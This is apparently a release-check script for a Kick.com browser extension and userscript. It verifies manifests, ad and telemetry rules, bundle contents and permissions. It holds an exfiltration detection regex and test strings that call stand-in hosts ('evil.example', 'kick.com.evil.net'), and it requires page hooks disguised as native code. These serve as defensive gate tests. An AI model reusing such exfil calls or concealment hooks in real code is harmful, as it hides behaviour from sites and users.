import { readFile } from 'node:fs/promises';
import { resolve } from 'node:path';
import { AD_HOSTS, TELEMETRY_HOSTS, TELEMETRY_NO_CANCEL_HOSTS, cancellableTelemetryHosts, STORAGE_STORES, buildSettingsExport, VERSION } from '../src/core.mjs';

const exportProbe = buildSettingsExport({
  settings: { probe: 1 }, stickers: 1, usage: 1, multistream: 1, channelLayouts: 1,
  favoriteChannels: [1], dismissedChannels: [1], chatKeywords: 1, channelNotes: 1, mediaPreferences: 1,
});

const read = (relative) => readFile(resolve(relative), 'utf8');
const readJson = async (relative) => JSON.parse(await read(relative));

const source = await read('dist/kick-focus.user.js');
const manifest = await readJson('dist/extension/manifest.json');
const packageJson = await readJson('package.json');
const content = await read('dist/extension/content/kick-focus.js');
const bridge = await read('dist/extension/content/bridge.js');
const adRules = await readJson('dist/extension/rules/ads.json');
const telemetryRules = await readJson('dist/extension/rules/telemetry.json');
const devManifest = await readJson('dist/extension/manifest.dev.json');
const firefoxManifest = await readJson('dist/extension-firefox/manifest.json');
const firefoxContent = await read('dist/extension-firefox/content/kick-focus.js');
const firefoxBridge = await read('dist/extension-firefox/content/bridge.js');
const firefoxBackground = await read('dist/extension-firefox/background.js');
const popup = await read('dist/extension/popup.js');
const extensionZip = await readFile(resolve(`dist/kick-focus-extension-v${VERSION}.zip`));

const mainWorld = manifest.content_scripts.find((entry) => entry.world === 'MAIN');
const isolated = manifest.content_scripts.find((entry) => entry.world === 'ISOLATED');
const ruleFiles = manifest.declarative_net_request.rule_resources;

// The trailing slash matters: without it the lookahead accepts a lookalike host
// like kick.com.evil.net, and the gate would pass on exfiltration.
const EXFIL_REGEX = /https:\/\/(?!(?:web\.|files\.|ext\.cdn\.)?kick\.com\/)[a-z0-9.-]+\/api\//i;

// A content-script match pattern must be an https (or *) URL whose host is
// kick.com or a subdomain of it — never <all_urls>, a bare *, or a lookalike
// like kick.com.evil.net. The final `/` after the host is what rejects the
// lookalike (kick.com.evil.net has no slash immediately after "com").
const KICK_MATCH_PATTERN = /^(https|\*):\/\/((\*|[a-z0-9-]+)\.)?kick\.com\//i;
const contentScriptsScoped = (entries) => entries.length > 0 && entries.every((entry) =>
  Array.isArray(entry.matches) && entry.matches.length > 0
  && entry.matches.every((pattern) => KICK_MATCH_PATTERN.test(pattern)));

/**
 * Every symbol a source module exports must be *defined* in every built bundle.
 *
 * `src/api.mjs` once shipped entirely missing: the build computed the bundle
 * string and then forgot to interpolate it. Every check still passed, because
 * `source.includes('playerEmbedUrl')` matches the call site in runtime.js just
 * as happily as the definition, and the unit tests import the module directly
 * rather than through the bundle. So this looks for the definition, and derives
 * the list from the source instead of a hand-maintained one — a module added
 * later is covered without anyone remembering to add it here.
 */
async function missingExports(moduleFile, bundle) {
  const moduleSource = await read(moduleFile);
  const missing = [];
  for (const match of moduleSource.matchAll(/^export\s+(?:async\s+)?(function|const|class)\s+([A-Za-z_$][\w$]*)/gm)) {
    const [, kind, name] = match;
    const defined = kind === 'function'
      ? new RegExp(`(?:^|\\n)(?:async\\s+)?function\\s+${name}\\b`).test(bundle)
      : new RegExp(`(?:^|\\n)${kind}\\s+${name}\\b`).test(bundle);
    if (!defined) missing.push(name);
  }
  return missing;
}

const bundleTargets = [['dist/kick-focus.user.js', source], ['dist/extension/content/kick-focus.js', content], ['dist/extension-firefox/content/kick-focus.js', firefoxContent]];
const moduleFiles = ['src/core.mjs', 'src/api.mjs', 'src/compatibility.mjs'];
const bundleGaps = [];
for (const [bundleName, bundleSource] of bundleTargets) {
  for (const moduleFile of moduleFiles) {
    const missing = await missingExports(moduleFile, bundleSource);
    if (missing.length) bundleGaps.push(`${bundleName} is missing ${missing.length} export(s) from ${moduleFile}: ${missing.slice(0, 6).join(', ')}`);
  }
}

const checks = [
  // The detail goes in the label, not the value: this loop treats any truthy
  // value as a pass, so `gaps.length === 0 || gaps.join()` would report success
  // precisely when there were gaps.
  [`every module export is defined in every bundle${bundleGaps.length ? ` — ${bundleGaps.join(' | ')}` : ''}`, bundleGaps.length === 0],
  // Userscript artifact
  ['metadata starts at byte zero', source.startsWith('// ==UserScript==')],
  ['version is synchronized', source.includes(`// @version      ${VERSION}`)],
  ['runs at document-start', source.includes('// @run-at       document-start')],
  ['targets Kick HTTPS', source.includes('// @match        https://kick.com/*')],
  ['contains no remote code dependency', !/@require\s|@resource\s/i.test(source)],
  ['ships settings UI', source.includes('data-kf-settings-shell')],
  ['keeps page state separate from navigation actions', source.includes('dataset.kfCurrentPage')
    && !source.includes('page.dataset.page =')],
  ['mounts the Focus control beside Get KICKs', source.includes('ensureHeaderQuickControl')
    && source.includes('data-testid="kicks-top-nav"')
    && source.includes('data-kf-header-control')],
  ['preserves sticker shelf scroll across organizer rerenders', source.includes('restoreStickerGridScroll')
    && source.includes('rememberStickerGridScroll')],
  ['collapses Kick native sticker chrome outside the Native view', source.includes('data-kf-sticker-native-list')
    && source.includes('data-kf-sticker-native-shell')
    && source.includes("nativeList.dataset.kfStickerNativeList = 'true'")
    && source.includes("shell.dataset.kfStickerNativeShell = 'true'")],
  ['labels the emote shelf as account-authorized', source.includes('New Kick emotes save automatically')
    && source.includes('max-height: min(720px, 76vh)')
    && source.includes('stickerButtonUnavailable')],
  ['persists and exports the complete sticker library', source.includes('mergeStickerLibrary')
    && source.includes('observeStickerPicker')
    && source.includes('observeChatStickerDiscovery')
    && source.includes("nativeGroups: ['Seen in chat']")
    && source.includes('renderStickerLibraryManager')
    && source.includes('stickers: stickerPreferencesValue()')],
  ['captures the mod own failures to a local, sanitized error log', source.includes('function logAppError')
    && source.includes('function guard(')
    && source.includes("logAppError('apply cycle'")
    && source.includes('data-kf-error-log')
    && source.includes('LAST_CRASH_KEY')],
  ['settings a11y: focus and scroll survive re-render, toasts announce, sliders are labelled', source.includes('function focusRestoreKey')
    && source.includes('restore.focus({ preventScroll: true })')
    && source.includes('role="status" aria-live="polite"')
    && source.includes("setAttribute('role', isError ? 'alert' : 'status')")
    && source.includes('aria-valuetext=')
    && source.includes('.kf-switch[aria-checked="true"] { background: Highlight; }')],
  ['pluralization is locale-correct via Intl.PluralRules, not a hand n===1 rule', source.includes('function pluralForm')
    && source.includes('new Intl.PluralRules')
    && source.includes('function plural(')],
  ['one-click add-to-multi is race-safe and lives in the header', source.includes('function mergeMultistream')
    && source.includes('function commitMultistream')
    && source.includes('function toggleCurrentChannelInMulti')
    && source.includes('data-kf-header-add-multi')
    && source.includes('function syncHeaderMultiState')],
  ['harvests emotes from realtime chat frames, image-validated before they take a slot', source.includes('function observationsFromChatEmotes')
    && source.includes('function queueChatEmoteHarvest')
    && source.includes('settings.liveChatEvents && settings.organizeChatStickers')
    && source.includes('new Image()')
    && source.includes('chatEmoteHarvest.negative')],
  ['caps the emote library without dropping new or acted-on records', source.includes('function evictStickerLibrary')
    && source.includes('function queueStickerPersist')
    && source.includes('if (state.stickerPreferences.hidden.has(sticker.key)) continue')
    && source.includes('state.stickerPreferences.library.delete(key)')],
  ['export payload covers every registered backup store', STORAGE_STORES.filter((store) => store.backup)
    .every((store) => (store.field === 'settings' ? ('probe' in exportProbe) : (store.field in exportProbe)))],
  ['import restores every backup store', source.includes('function applyImportedStores')
    && source.includes('gmSet(CHANNEL_LAYOUT_KEY, result.channelLayouts)')
    && source.includes('state.channelNotes = result.channelNotes')
    && source.includes('state.mediaPreferences = result.mediaPreferences')
    && source.includes('new Set(result.favoriteChannels)')],
  ['import drops prototype-pollution keys and is non-destructive', source.includes('POLLUTION_KEYS')
    && source.includes('PRE_IMPORT_BACKUP_KEY')
    && source.includes('function undoImport')],
  ['reset keeps the emote library and clears every private store', source.includes('resetStickerPreferences({ keepLibrary: true })')
    && source.includes('function clearPrivateData')
    && source.includes('gmDelete(CHANNEL_NOTES_KEY)')
    && source.includes('gmDelete(EMOTE_USAGE_KEY)')],
  // R-05: privileged transport hardening.
  ['blocklist fetch is pinned to the configured URL, not the event', bridge.includes('readSettings()?.content?.blocklistUrl')
    && firefoxBridge.includes('readSettings()?.content?.blocklistUrl')
    && !bridge.includes('const url = event.detail?.url')],
  ['bridge sanitizes announced settings before storing them', bridge.includes('function sanitizeSettings')
    && firefoxBridge.includes('function sanitizeSettings')],
  ['companion presence is a live nonce round-trip, not a page-set attribute', source.includes('function handshakeCompanion')
    && source.includes("'kick-focus:companion-pong'")
    && bridge.includes("'kick-focus:companion-ping'")
    && firefoxBridge.includes("'kick-focus:companion-ping'")],
  ['userscript blocklist transport omits ambient cookies', source.includes('anonymous: true')],
  ['blocklist URL is https-validated at normalize time', source.includes('function normalizeBlocklistUrl')
    && source.includes('normalizeBlocklistUrl(content.blocklistUrl)')],
  ['offers a three-row one-click favorites shelf', source.includes('stickerQuickProxyMarkup')
    && source.includes('data-kf-sticker-quick-grid')
    && source.includes('max-height: 156px')],
  ['styles the current semantic Kick shell', source.includes(':is(main, #main-container)')
    && source.includes('[data-testid="livestream-results-card"]')
    && source.includes('#channel-chatroom')],
  ['ships route-specific search and Drops recovery', source.includes('applySearchEnhancements')
    && source.includes('applyDropsEnhancements')
    && source.includes('data-kf-drops-empty')],
  ['lets explicit home preview playback override autoplay suppression', source.includes("video.dataset.kfManualPlayback = 'true'")
    && source.includes("if (video.dataset.kfManualPlayback !== 'true') video.pause()")],
  ['embeds the local product icon', source.includes('data:image/png;base64,') && !source.includes('__KICK_FOCUS_ICON__')],
  ['embeds the local appearance preview', source.includes('data:image/jpeg;base64,') && !source.includes('__KICK_FOCUS_PREVIEW__')],
  ['ships SPA lifecycle hook', source.includes('kick-focus:routechange')],
  ['ships ad request classification', source.includes('classifyRequest')],
  ['guards against double boot', source.includes('__kickFocusBooted')],

  // Version parity across every artifact that states one
  ['package.json version matches', packageJson.version === VERSION],
  ['manifest version matches', manifest.version === VERSION],

  // Extension shape
  ['manifest is v3', manifest.manifest_version === 3],
  ['page world script runs at document_start', mainWorld?.run_at === 'document_start'],
  ['page world script is the built bundle', content.includes('data-kf-settings-shell')],
  ['bridge runs in the isolated world', isolated?.run_at === 'document_start'],
  ['bridge advertises the companion', bridge.includes('kickFocusCompanion')],
  ['userscript reports the companion layer', source.includes("'kick-focus:companion-ping'")],
  ['extension requests no broad host access', manifest.host_permissions.every((entry) => entry.includes('kick.com'))],
  ['extension loads only local scripts', manifest.content_scripts
    .flatMap((entry) => entry.js)
    .every((file) => !/^(https?:)?\/\//.test(file))],
  ['extension declares no remote code', !('externally_connectable' in manifest)
    && !JSON.stringify(manifest.background).includes('//')],

  // Network rules stay in lockstep with the page-realm blocklist. Each gate
  // also asserts the list is non-empty, so an emptied host list fails loudly
  // instead of passing an every()/length gate vacuously.
  ['ad ruleset covers every blocked host', AD_HOSTS.length > 0 && adRules.length === AD_HOSTS.length],
  ['telemetry ruleset covers every cancellable telemetry host', cancellableTelemetryHosts().length > 0 && telemetryRules.length === cancellableTelemetryHosts().length],
  ['litix.io is never hard-cancelled at the network layer (retry-storm host)', TELEMETRY_NO_CANCEL_HOSTS.every((host) =>
    !telemetryRules.some((rule) => rule.condition.urlFilter?.includes(host))
    && !adRules.some((rule) => rule.condition.urlFilter?.includes(host))
    && !firefoxBackground.includes(host))],
  ['ad rules block', adRules.length > 0 && adRules.every((rule) => rule.action.type === 'block')],
  ['every rule is scoped to kick.com', [...adRules, ...telemetryRules].length > 0 && [...adRules, ...telemetryRules]
    .every((rule) => rule.condition.initiatorDomains?.includes('kick.com'))],
  ['content scripts match only kick.com, never a broad pattern', contentScriptsScoped(manifest.content_scripts)],
  ['rule ids are unique', new Set([...adRules, ...telemetryRules].map((rule) => rule.id)).size
    === adRules.length + telemetryRules.length],
  ['ads ruleset ships enabled', ruleFiles.find((entry) => entry.id === 'ads')?.enabled === true],
  ['telemetry ruleset ships opt-in', ruleFiles.find((entry) => entry.id === 'telemetry')?.enabled === false],

  // Favorites are ordered and scoped. The shelf must render them in the stored
  // order rather than the picker's, or the ordering controls do nothing
  // visible; and the order has to be part of the render signature.
  ['favorites are scoped per channel and explicitly ordered',
    source.includes('favoritesForChannel')
    && source.includes('toggleStickerFavorite')
    && source.includes('moveStickerFavorite')
    && source.includes('byFavoriteOrder')
    && source.includes('favoriteKeysInOrder().join')
    && source.includes("data-kf-sticker-move=\"up\"")],

  // A locked tile must explain itself and link to Kick's own unlock path —
  // and must never enable anything. The link is the only action offered.
  ['a locked emote says why and links to Kick own unlock path',
    source.includes('emoteLockState')
    && source.includes('kf-sticker-lock')
    && source.includes('Unlock on Kick')
    && source.includes('/collectibles')],

  // Replacing an iframe restarts its stream, so tile reuse is decided by a
  // core function that is tested without a browser rather than inline here.
  // A deletion must annotate its node once: the guard is what stops chat
  // virtualisation from stacking a second note on every apply cycle.
  ['multi-stream invariants are decided where they can be tested offline',
    source.includes('planMultistreamTiles')
    && source.includes('multistreamTileMuted')
    && source.includes("node.dataset.kfDeletionNoted === 'true'")],

  // A reverse scan of 252 entries per string, on every text node, on every
  // render — and ambiguous, because some English sources are also translated
  // values. Lookup is one forward hit against a remembered original.
  ['translation is a forward lookup with no reverse scan',
    source.includes('const TEXT_SOURCE = new WeakMap()')
    && source.includes('const ATTRIBUTE_SOURCE = new WeakMap()')
    && !source.includes('function canonicalTranslation')],

  // A shared link is untrusted input, so it must go back through the same slug
  // validation the grid uses rather than being spread into state directly.
  ['layouts are shareable as links and revalidated on the way in',
    source.includes('multistreamLayoutLink')
    && source.includes('parseMultistreamLink')
    && source.includes('multistream-copy-layout')
    && source.includes('openSharedLayoutFromUrl')],
  // One bulk call, not one per channel: a shelf of saved layouts must not turn
  // into dozens of requests for the same answer.
  ['saved layouts read live status from one bulk request',
    source.includes('endpoints.currentViewers')
    && source.includes('normalizeCurrentViewers')
    && source.includes('kf-ms-live')],

  // Kick publishes no drop odds and documents no duplicate protection. The
  // duplicate figure must therefore be measured or declared unavailable — the
  // one thing it must never be is inferred.
  ['states the collectible facts Kick leaves unexplained without inventing any',
    source.includes('COLLECTIBLE_FACTS')
    && source.includes('summarizeCollectibleInventory')
    && source.includes('kf-fact-list')
    && source.includes('quantityKnown')
    && source.includes('cannot be measured')],

  // Kick edits emotes users already pulled, so the local record is the only
  // copy that can prove it. Timestamps and the prior value must both survive.
  ['snapshots the emote library with first-seen, last-seen, and what Kick changed',
    source.includes('recordStickerObservation')
    && source.includes('describeStickerChange')
    && source.includes('countChangedStickers')
    && source.includes('kf-sticker-changed')
    && source.includes('wasName')],

  // The degradation path is the point: an unreachable badge image must read as
  // the badge's name, never as an empty box.
  ['renders the chat badges Kick omits and degrades a broken image to text',
    source.includes('chatBadgesToRender')
    && source.includes('kf-chat-badge')
    && source.includes('chatBadgeText')
    && source.includes("image.addEventListener('error'")],

  ['ships a named-channel blocklist for discovery surfaces', source.includes('localChannelBlocked')
    && source.includes('data-kf-hidden-channel-input')
    && source.includes('add-hidden-channel')
    && source.includes('remove-hidden-channel')],

  ['API drift is recorded and reported on the About page', source.includes('recordApiDrift')
    && source.includes('assessApiDrift')
    && source.includes('data-kf-api-drift')],

  ['blocklist fetch prefers a CORS-free transport', source.includes('fetchBlocklistText')
    && source.includes('GM_xmlhttpRequest')
    && source.includes('kick-focus:fetch-blocklist')
    && source.includes('kick-focus:blocklist-result')],

  ['reports storage writes that fail instead of losing data', source.includes('noteStorageResult')
    && source.includes('describeStorageFailures')
    && source.includes('data-kf-storage-alert')
    && source.includes('renderStorageHealthPanel')],

  ['restores quality where the player actually reads it', source.includes("const QUALITY_SESSION_KEY = 'stream_quality'")
    && source.includes('applyQualitySessionKey')
    && source.includes('[role="menuitemradio"]')],
  ['volume memory ignores the autoplay-policy mute', source.includes('VOLUME_GRACE_MS')
    && source.includes('elapsed < VOLUME_GRACE_MS && video.muted')],

  ['releases the player from blocked ad preflight scripts', source.includes('installPlayerLoadingFix')
    && source.includes('isAdPreflightScript')
    && source.includes('/pal/sdkloader/pal.js')
    // Capture phase is mandatory: resource errors do not bubble.
    && source.includes("pageWindow.addEventListener('error'")],

  ['ships a multi-stream grid built on Kick own embeds', source.includes('data-kf-multistream-grid')
    && source.includes('playerEmbedUrl')
    && source.includes('chatEmbedUrl')
    && source.includes('normalizeMultistream')
    // Audio follows focus: a nine-tile grid must never be nine audio streams.
    && source.includes('applyMultistreamAudio')],
  // Every framed URL must be a Kick origin. The trailing slash matters, or a
  // lookalike host such as player.kick.com.evil.net would satisfy the lookahead.
  // WCAG 2.2.2 and 1.4.2: autoplaying tiles need a visible, keyboard-reachable
  // way to stop them, and prefers-reduced-motion is not a substitute for one.
  ['multi-stream can be paused and muted as a whole', source.includes('data-kf-multistream-pause')
    && source.includes('data-kf-multistream-mute')
    && source.includes('multistreamTileMuted')
    && source.includes("matchMedia('(prefers-reduced-motion: reduce)').matches")],
  // A cross-origin embed cannot be paused or quality-capped, so unloading its
  // document is the only control over decode cost that exists.
  ['states the limitations users would otherwise hit blind', source.includes('kf-ms-chat-notice')
    && source.includes('Kick blocks sending from an embedded chat')
    && source.includes('no kick.com host at all')],
  ['focus is contained in whichever overlay is on top', source.includes('function topmostOverlayShell')
    && source.includes('kf-ms-shell')
    && source.includes('kf-command-shell')
    && !source.includes('if (!state.modal.hidden && trapFocus(event)) return;')],
  ['multi-stream suspends tiles nobody is watching', source.includes('multistreamTileActive')
    && source.includes('installMultistreamSuspension')
    && source.includes('observeMultistreamVisibility')
    && source.includes("document.addEventListener('visibilitychange'")],
  ['player embeds request no permission they do not use', source.includes("frame.allow = 'autoplay; fullscreen; picture-in-picture'")
    && !source.includes('picture-in-picture; encrypted-media')],
  ['multi-stream embeds only Kick origins', source.includes('https://player.kick.com/')
    && !/https:\/\/(?!(?:player\.|web\.|files\.|ext\.cdn\.)?kick\.com\/)[a-z0-9.-]+\/(?:popout|embed)\//i.test(source)],

  ['offers a hover-expanding dropdown sidebar mode', source.includes('data-kf-sidebar="dropdown"')
    && source.includes('[aria-controls="sidebar-wrapper"]')
    && source.includes('min-width: 1280px')
    // A panel that slides out under the pointer must honour reduced motion.
    && source.includes('prefers-reduced-motion: reduce')],
  ['multi-stream is reachable without opening settings', source.includes('data-kf-header-multi')
    && source.includes('kf-header-multi')],

  ['export carries every store the About page lists', source.includes('usage: state.emoteUsage')
    && source.includes('multistream: state.multistream')
    && source.includes('normalizeEmoteUsage')],

  // Kick's own data, read read-only and same-origin
  ['reads the realtime provider from Kick instead of hardcoding it',
    source.includes('normalizeRealtimeConnection')
    && source.includes('endpoints.realtimeChat')
    // The app key must never be written in this source; it is read at runtime.
    && !source.includes('32cbd69e4b950bf97679')],
  // The transport (URL + credentials) is the only per-provider part. If the
  // socket wiring ever inlines a subscribe frame or a JSON.parse of a frame
  // again, a second provider becomes a rewrite instead of a registry entry.
  ['realtime transport is swappable without touching the frame protocol',
    source.includes('REALTIME_TRANSPORTS')
    && source.includes('connection.transport.socketUrl(connection)')
    && source.includes('realtimeSubscribeFrame')
    && source.includes('parseRealtimeFrame')
    && !source.includes("event: 'pusher:subscribe', data: { auth: '', channel: name }")],
  // An unverified transport must never be described as working.
  ['an unverified realtime transport degrades and says so',
    source.includes('providerVerified')
    && source.includes('unverified-transport-failed')
    && source.includes('(unverified transport)')],
  ['sources the emote catalog from the API but keeps the DOM fallback',
    source.includes('refreshEmoteCatalog')
    && source.includes('normalizeEmoteSets')
    && source.includes("state.live.catalogSource = 'api'")
    && source.includes('observeStickerPicker')],
  // The realtime subscription is anonymous and public, so frames are untrusted
  // input by construction and the bounds belong at the boundary.
  ['realtime frames are bounded before use', source.includes('function boundedString')
    && source.includes('const LIMITS = Object.freeze(')
    && source.includes('/^#[0-9a-f]{3,8}$/i.test')],
  ['explains removed messages the DOM cannot', source.includes('normalizeDeletion')
    && source.includes('annotateDeletedMessage')
    && source.includes('kf-deletion-note')],
  ['counts real emote usage', source.includes('recordEmoteUse')
    && source.includes('kick-focus:emote-usage')],
  ['shows collectible rarity only when the join is confident', source.includes('joinCollectibleRarity')
    && source.includes('rarityBadge')
    && source.includes('state.live.rarity = join.usable ? join : null')],
  ['renders wide collectibles at their measured aspect', source.includes('measureEmoteAspect')
    && source.includes('data-kf-emote-aspect="wide"')],
  ['every API endpoint stays on kick.com', !EXFIL_REGEX.test(source)],
  ['gives High Contrast a real focus outline', source.includes('forced-colors: active')
    && source.includes('outline: 3px solid Highlight')],
  ['page-realm hooks do not announce themselves', source.includes('function disguise(')
    && source.includes('[native code]')],

  // The release manifest drops declarativeNetRequestFeedback to avoid the
  // "Read your browsing history" Chrome warning.  The counter in background.js
  // already degrades — it shows "—" in the popup when the debug API is absent.
  ['release manifest omits the feedback permission', !manifest.permissions.includes('declarativeNetRequestFeedback')],
  ['dev manifest provides the feedback permission', devManifest.permissions.includes('declarativeNetRequestFeedback')],
  ['release zip excludes the dev manifest', !extensionZip.toString('latin1').includes('manifest.dev.json')],
  ['popup uses the browser-or-chrome shim so the Firefox popup renders live', popup.includes('globalThis.browser || globalThis.chrome')
    && popup.includes('api.tabs.query')
    && popup.includes('api.runtime.sendMessage')
    && !popup.includes('chrome.tabs.query')],

  // Firefox companion shape
  ['Firefox manifest version matches', firefoxManifest.version === VERSION],
  ['Firefox manifest is v2', firefoxManifest.manifest_version === 2],
  ['Firefox manifest has a stable extension id', firefoxManifest.browser_specific_settings?.gecko?.id === 'kick-focus@sysadmindoc'],
  ['Firefox background is local and non-persistent', firefoxManifest.background?.scripts?.includes('background.js')
    && firefoxManifest.background?.persistent === false],
  ['Firefox requests the blocking permission', firefoxManifest.permissions?.includes('webRequestBlocking')],
  ['Firefox content bridge runs at document_start', firefoxManifest.content_scripts?.[0]?.run_at === 'document_start'],
  ['Firefox page bundle is web-accessible', firefoxManifest.web_accessible_resources?.includes('content/kick-focus.js')],
  ['Firefox page bundle contains the settings UI', firefoxContent.includes('data-kf-settings-shell')],
  ['Firefox bridge injects the local page bundle', firefoxBridge.includes("runtime.getURL('content/kick-focus.js')")],
  ['Firefox network layer uses blocking listeners', firefoxBackground.includes('onBeforeRequest')
    && firefoxBackground.includes("['blocking']")
    && firefoxBackground.includes('return { cancel: true }')],
  // Behaviour, not spelling: `test/companion.test.js` runs this background against a
  // stubbed browser API with Firefox-shaped details. A gate asserting the field name
  // is what previously kept the Chromium-only `details.initiator` bug alive.
  ['Firefox network layer reads the Gecko initiator fields', firefoxBackground.includes('details?.originUrl')
    && firefoxBackground.includes('details?.documentUrl')],
  ['Firefox host lists are generated', !firefoxBackground.includes('__AD_HOSTS__')
    && !firefoxBackground.includes('__TELEMETRY_HOSTS__')],
  ['Firefox requests no broad host access', !firefoxManifest.permissions.includes('<all_urls>')],
  ['Firefox does not request the tabs permission', !firefoxManifest.permissions.includes('tabs')],
  ['Firefox enumerates every ad and cancellable telemetry host', [...AD_HOSTS, ...cancellableTelemetryHosts()]
    .every((host) => firefoxManifest.permissions.some((perm) => perm.includes(host)))],
  ['Firefox does not request host access for the never-cancel telemetry host', TELEMETRY_NO_CANCEL_HOSTS
    .every((host) => !firefoxManifest.permissions.some((perm) => perm.includes(host)))],
  ['Firefox declares no data collection', firefoxManifest.browser_specific_settings?.gecko
    ?.data_collection_permissions?.required?.[0] === 'none'],
];

// Red probes: crafted-bad inputs each de-vacuumed gate must reject. If a gate
// ever becomes vacuous (passes on empty/hostile input), its probe returns true
// and this fails — the gate's proof that it can actually fire.
const redProbes = [
  ['ad-ruleset gate would reject an empty ad list', !(0 > 0 && [].length === 0)],
  ['content-scripts gate would reject <all_urls>', !contentScriptsScoped([{ matches: ['<all_urls>'] }])],
  ['content-scripts gate would reject an off-kick host', !contentScriptsScoped([{ matches: ['*://*.evil.net/*'] }])],
  ['content-scripts gate would reject an empty matches list', !contentScriptsScoped([{ matches: [] }])],
  ['exfil gate would catch an off-origin api call', EXFIL_REGEX.test('fetch(`https://evil.example/api/v1/log`)')],
  ['exfil gate would catch a lookalike host', EXFIL_REGEX.test('https://kick.com.evil.net/api/v1/log')],
  // The live gate itself must be the real thing on this machine, not a skip.
  ['content-scripts gate accepts the real manifest', contentScriptsScoped(manifest.content_scripts)],
];
for (const [label, fires] of redProbes) {
  if (!fires) throw new Error(`Red probe failed (gate is vacuous): ${label}`);
}

for (const [label, passed] of checks) {
  if (!passed) throw new Error(`Check failed: ${label}`);
  console.log(`OK ${label}`);
}
console.log(`${checks.length} checks passed; ${redProbes.length} red probes fired.`);
